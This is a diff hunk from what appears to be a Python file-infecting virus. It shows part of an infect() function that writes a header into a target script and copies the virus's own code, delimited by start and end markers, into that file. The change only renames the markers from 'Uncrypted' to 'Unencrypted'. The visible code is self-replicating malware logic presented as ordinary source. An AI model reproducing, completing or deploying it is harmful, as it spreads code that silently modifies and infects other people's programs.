@@ -22,15 +22,15 @@ def infect(filename):
 
    destination.write("\n######################################################## First script python\n")
    destination.write("# coding=utf-8\n")
-   destination.write("# Start Uncrypted\n")
+   destination.write("# Start Unencrypted\n")
 
    copy = False
    result = ''
    for line in this:
-      if line.strip() == '# Start Uncrypted':
+      if line.strip() == '# Start Unencrypted':
          copy = True
-      elif line.strip() == '# End Uncrypted':
-         destination.write('# End Uncrypted')
+      elif line.strip() == '# End Unencrypted':
+         destination.write('# End Unencrypted')
          copy = False
       elif copy:
          destination.write(line);
